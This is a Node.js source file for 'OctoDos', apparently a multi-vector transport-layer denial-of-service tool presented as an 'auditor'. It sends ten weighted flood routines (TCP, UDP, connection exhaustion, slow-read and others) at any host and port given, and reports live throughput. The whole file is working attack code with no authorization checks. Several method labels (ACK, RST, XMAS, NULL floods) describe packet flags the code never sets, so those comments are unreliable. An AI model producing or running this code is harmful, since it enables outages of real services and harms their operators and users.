/**
 * OctoDos L4 Engine v1.0.0 — Transport Layer Multi-Vector Auditor
 *
 * 10 Coordinated Tentacle Methods:
 *   - TCP-FLOOD:    Rapid connection + data push
 *   - UDP-FLOOD:    Volumetric UDP bombardment
 *   - SYN-STORM:    Half-open connection flooding
 *   - SLOWREAD:     Slow read buffer exhaustion
 *   - CONN-EXHAUST: Connection pool exhaustion
 *   - FRAG-ATTACK:  Fragmented UDP packet simulation
 *   - ACK-FLOOD:    TCP ACK packet flooding
 *   - RST-FLOOD:    TCP RST packet flooding
 *   - XMAS-FLOOD:   TCP XMAS scan (all flags set)
 *   - NULL-FLOOD:   TCP NULL packet flooding
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const net = require('net');
const dgram = require('dgram');
const chalk = require('chalk');
const crypto = require('crypto');
const { randomHex, randInt } = require('./antiwaf');

function randomPayload(min = 64, max = 1460) { return crypto.randomBytes(randInt(min, max)); }

// ── METHOD 1: TCP-FLOOD ──
async function tcpFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => {
                stats.success++;
                const frames = randInt(1, 5);
                for (let i = 0; i < frames; i++) {
                    try { const p = randomPayload(128, 1460); socket.write(p); stats.bytes += p.length; } catch { break; }
                }
                socket.destroy(); resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 2: UDP-FLOOD ──
async function udpFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const client = dgram.createSocket('udp4');
            const payload = randomPayload(64, 1472);
            client.send(payload, 0, payload.length, port, host, (err) => {
                if (!err) { stats.bytes += payload.length; stats.success++; } else stats.failed++;
                stats.total++; try { client.close(); } catch {} resolve();
            });
        });
    }
}

// ── METHOD 3: SYN-STORM ──
async function synStorm(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(500);
            socket.on('connect', () => { stats.success++; socket.destroy(); resolve(); });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 4: SLOWREAD ──
async function slowRead(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(0);
            socket.on('connect', () => {
                stats.success++;
                try { socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nAccept: */*\r\n\r\n`); stats.bytes += 60; } catch {}
                socket.pause();
                const readTimer = setInterval(() => {
                    if (Date.now() >= endTime) { clearInterval(readTimer); socket.destroy(); resolve(); return; }
                    socket.resume(); setTimeout(() => socket.pause(), 10);
                    stats.total++;
                }, randInt(2000, 8000));
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('close', () => resolve());
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 5: CONN-EXHAUST ──
async function connExhaust(host, port, endTime, stats) {
    const sockets = [];
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(0);
            socket.on('connect', () => {
                stats.success++; sockets.push(socket);
                const keepAlive = setInterval(() => {
                    if (Date.now() >= endTime) { clearInterval(keepAlive); socket.destroy(); return; }
                    try { socket.write(Buffer.from([0x00])); stats.bytes += 1; } catch { clearInterval(keepAlive); socket.destroy(); }
                }, randInt(5000, 15000));
                resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
    sockets.forEach(s => { try { s.destroy(); } catch {} });
}

// ── METHOD 6: FRAG-ATTACK ──
async function fragAttack(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        const burstSize = randInt(5, 20);
        const tasks = [];
        for (let i = 0; i < burstSize; i++) {
            tasks.push(new Promise((resolve) => {
                const client = dgram.createSocket('udp4');
                const payload = crypto.randomBytes(randInt(8, 28));
                client.send(payload, 0, payload.length, port, host, (err) => {
                    if (!err) { stats.success++; stats.bytes += payload.length; } else stats.failed++;
                    stats.total++; try { client.close(); } catch {} resolve();
                });
            }));
        }
        await Promise.all(tasks);
    }
}

// ── METHOD 7: ACK-FLOOD ──
async function ackFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1000);
            socket.on('connect', () => {
                stats.success++;
                // Send ACK-like data bursts (rapid data push simulating ACK flood)
                const burst = randInt(3, 10);
                for (let i = 0; i < burst; i++) {
                    try {
                        const ackData = Buffer.alloc(randInt(40, 100), 0x10); // ACK flag simulation
                        socket.write(ackData);
                        stats.bytes += ackData.length;
                        stats.total++;
                    } catch { break; }
                }
                socket.destroy(); resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 8: RST-FLOOD ──
async function rstFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(500);
            socket.on('connect', () => {
                stats.success++;
                // Send garbage then immediately reset
                try {
                    socket.write(randomPayload(64, 256));
                    stats.bytes += 64;
                } catch {}
                // Force RST by destroying without proper FIN
                socket.destroy();
                resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 9: XMAS-FLOOD ──
async function xmasFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1000);
            socket.on('connect', () => {
                stats.success++;
                // XMAS: send data with all flags set (simulation via random payload with 0x29/URG+PSH+FIN pattern)
                try {
                    const xmasPayload = Buffer.alloc(randInt(40, 120));
                    xmasPayload.fill(0x29); // URG+PSH+FIN flag pattern
                    xmasPayload[0] = 0xFF; // All flags marker
                    socket.write(xmasPayload);
                    stats.bytes += xmasPayload.length;
                } catch {}
                socket.destroy();
                resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ── METHOD 10: NULL-FLOOD ──
async function nullFlood(host, port, endTime, stats) {
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1000);
            socket.on('connect', () => {
                stats.success++;
                // NULL: send zeroed-out packets (no TCP flags, confuses firewalls)
                try {
                    const nullPayload = Buffer.alloc(randInt(40, 200), 0x00);
                    socket.write(nullPayload);
                    stats.bytes += nullPayload.length;
                } catch {}
                socket.destroy();
                resolve();
            });
            socket.on('error', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.on('timeout', () => { stats.failed++; socket.destroy(); resolve(); });
            socket.connect(port, host); stats.total++;
        });
    }
}

// ══════════════════════════════════════════
// TENTACLE COORDINATOR
// ══════════════════════════════════════════
async function startL4(target, threads, time) {
    const [host, portStr] = target.split(':');
    const port = portStr ? parseInt(portStr) : 80;

    console.log(chalk.hex('#4158D0').bold('\n  ┌──────────────────────────────────────────────────┐'));
    console.log(chalk.hex('#4158D0').bold('  │   🐙 L4 OCTOPUS TENTACLE ENGINE — 10 Methods      │'));
    console.log(chalk.hex('#4158D0').bold('  └──────────────────────────────────────────────────┘'));
    console.log(chalk.cyan(`  Target:    ${host}:${port}`));
    console.log(chalk.cyan(`  Threads:   ${threads}`));
    console.log(chalk.cyan(`  Duration:  ${time}s`));

    const methods = [
        { name: 'TCP-FLOOD',    fn: tcpFlood,    weight: 20 },
        { name: 'UDP-FLOOD',    fn: udpFlood,    weight: 15 },
        { name: 'SYN-STORM',    fn: synStorm,    weight: 15 },
        { name: 'SLOWREAD',     fn: slowRead,    weight: 7 },
        { name: 'CONN-EXHAUST', fn: connExhaust, weight: 7 },
        { name: 'FRAG-ATTACK',  fn: fragAttack,  weight: 8 },
        { name: 'ACK-FLOOD',    fn: ackFlood,    weight: 8 },
        { name: 'RST-FLOOD',    fn: rstFlood,    weight: 8 },
        { name: 'XMAS-FLOOD',   fn: xmasFlood,   weight: 6 },
        { name: 'NULL-FLOOD',   fn: nullFlood,   weight: 6 },
    ];

    const totalWeight = methods.reduce((a, m) => a + m.weight, 0);
    const methodNames = [];
    console.log(chalk.yellow('\n  🐙 Tentacle Distribution (coordinated multi-vector):'));
    methods.forEach(m => {
        const t = Math.max(1, Math.round((m.weight / totalWeight) * threads));
        console.log(chalk.gray(`    ▸ ${m.name.padEnd(14)} ${String(t).padStart(3)} threads (${m.weight}%)`));
        methodNames.push(m.name);
    });
    console.log(chalk.gray(`\n    All 10 tentacles converge on ${host}:${port}.`));
    console.log(chalk.gray(`    TCP + UDP + SYN + ACK + RST + XMAS + NULL = octopus grip.\n`));

    const endTime = Date.now() + (time * 1000);
    const startTime = Date.now();
    const stats = { total: 0, success: 0, failed: 0, bytes: 0 };

    const statsInterval = setInterval(() => {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const cps = (stats.total / (elapsed || 1)).toFixed(0);
        const kb = (stats.bytes / 1024).toFixed(1);
        process.stdout.write(chalk.gray(`\r  [🐙] Conn: ${stats.total} | OK: ${stats.success} | Fail: ${stats.failed} | CPS: ${cps} | Data: ${kb}KB | ${elapsed}s   `));
    }, 400);

    const threadPool = [];
    for (const method of methods) {
        const count = Math.max(1, Math.round((method.weight / totalWeight) * threads));
        for (let i = 0; i < count; i++) { threadPool.push(method.fn(host, port, endTime, stats)); }
    }

    await Promise.all(threadPool);
    clearInterval(statsInterval);
    process.stdout.write('\n');

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
    const cps = (stats.total / elapsed).toFixed(0);

    console.log(chalk.hex('#4158D0').bold('\n  ┌──────────────────────────────────────────────────┐'));
    console.log(chalk.hex('#4158D0').bold('  │   📊 L4 AUDIT RESULTS                             │'));
    console.log(chalk.hex('#4158D0').bold('  └──────────────────────────────────────────────────┘'));
    console.log(chalk.white(`  Total Connections:  ${stats.total}`));
    console.log(chalk.white(`  Successful:         ${stats.success}`));
    console.log(chalk.white(`  Failed:             ${stats.failed}`));
    console.log(chalk.white(`  Data Sent:          ${(stats.bytes / 1024).toFixed(2)} KB`));
    console.log(chalk.white(`  Avg CPS:            ${cps}`));
    console.log(chalk.white(`  Duration:           ${elapsed}s`));
    console.log(chalk.white(`  Tentacles Used:     ${methods.length} (${methodNames.join(', ')})`));

    return {
        totalConnections: stats.total, successfulConnections: stats.success,
        failedConnections: stats.failed, dataBytesSent: stats.bytes,
        cps: parseInt(cps), elapsed, methodsUsed: methodNames,
    };
}

module.exports = { startL4 };
